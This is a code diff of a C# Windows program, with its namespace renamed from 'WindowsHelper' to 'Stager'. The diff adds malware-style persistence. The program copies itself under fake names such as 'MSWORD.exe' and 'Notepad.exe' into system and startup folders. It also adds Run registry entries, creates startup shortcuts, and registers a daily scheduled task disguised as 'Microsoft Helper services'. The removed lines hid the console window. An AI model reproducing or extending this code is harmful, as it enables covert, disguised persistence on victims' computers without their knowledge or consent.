@@ -1,9 +1,12 @@
-﻿using Microsoft.Win32;
+using Microsoft.Win32;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
+using IWshRuntimeLibrary;
+using Microsoft.Win32.TaskScheduler;
+using File = System.IO.File;
 
-namespace WindowsHelper
+namespace Stager
 {
     internal class CurrentSystem
     {
@@ -18,10 +21,9 @@ namespace WindowsHelper
 
         public CurrentSystem()
         {
-            var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE);
+            //var handle = GetConsoleWindow();
+            //ShowWindow(handle, SW_HIDE);
             Console.WriteLine("Console should be hidden now");
-            String tshis = "asdas";
         }
         public bool hasRan()
         {
@@ -37,27 +39,58 @@ namespace WindowsHelper
         }
         public void AddToStartup()
         {
-            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             string executableName = Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location);
             string executableFullPath = Directory.GetCurrentDirectory() + "\\" + executableName;
-            if (startupKey.GetValue(executableName) == null)
+            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+            List<string> paths = new List<string> { @"C:\", @"C:\Program Files\", @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" };
+            List<string> randomFileNames = new List<string> { "MSWORD.exe", "Notepad.exe" };
+            Random rand = new Random();
+
+            foreach (string path in paths)
             {
-                // Add the executable to startup
-                List<String> randomFileNames = new List<String>() { "MSWORD.exe", "Notepad.exe" };
-                List<String> copyPaths = new List<String>() { "C:\\", "C:\\Users\\" };
-                var rand = new Random();
-                foreach (string path in copyPaths)
+                string copyPath = Path.Combine(path, randomFileNames[rand.Next(randomFileNames.Count)]);
+                if (!File.Exists(copyPath))
                 {
-                    string copyPathNow = Path.Combine(path + randomFileNames[rand.Next(randomFileNames.Count)]);
-                    File.Copy(executableFullPath, copyPathNow);
-                    startupKey.SetValue("MSWORD" + copyPaths.FindIndex(a => a.Contains(path)), copyPathNow);
+                    if (startupKey.GetValue(copyPath) == null)
+                    {
+
+                        File.Copy(executableFullPath, copyPath);
+                        Console.WriteLine("Copied " + executableFullPath + " to " + copyPath);
+
+                        startupKey.SetValue(path, copyPath);
+                        Console.WriteLine("Added " + executableFullPath + " to startup.");
+
+                    }
                 }
-                startupKey.SetValue(executableName, executableFullPath);
-                Console.WriteLine("Added to startup.");
-            }
-            else
-            {
-                Console.WriteLine("Already in startup.");
+
+                string shortcutPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileNameWithoutExtension(copyPath) + ".lnk");
+                if (!File.Exists(shortcutPath))
+                {
+                    WshShell shell = new WshShell();
+                    IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
+                    shortcut.TargetPath = copyPath;
+                    shortcut.Save();
+
+                    Console.WriteLine("Created shortcut " + shortcutPath);
+                }
+
+                using (TaskService taskService = new TaskService())
+                {
+                    try
+                    {
+                        TaskDefinition taskDefinition = taskService.NewTask();
+                        taskDefinition.RegistrationInfo.Description = "Microsoft Helper services";
+                        taskDefinition.Triggers.Add(new DailyTrigger { DaysInterval = 1, StartBoundary = DateTime.Today.AddHours(10) });
+                        taskDefinition.Actions.Add(new ExecAction(copyPath));
+                        taskService.RootFolder.RegisterTaskDefinition(Path.GetFileNameWithoutExtension(copyPath), taskDefinition);
+                        Console.WriteLine("Created scheduled task for " + copyPath);
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("Failed to create scheduled task for " + copyPath + ": " + ex.Message);
+                    }
+                }
             }
         }
 
@@ -87,7 +120,7 @@ namespace WindowsHelper
                 // Add your main program logic here
             }
 
-            // Environment.Exit(0);
+            Environment.Exit(0);
         }
 
         internal bool IsAdministrator()
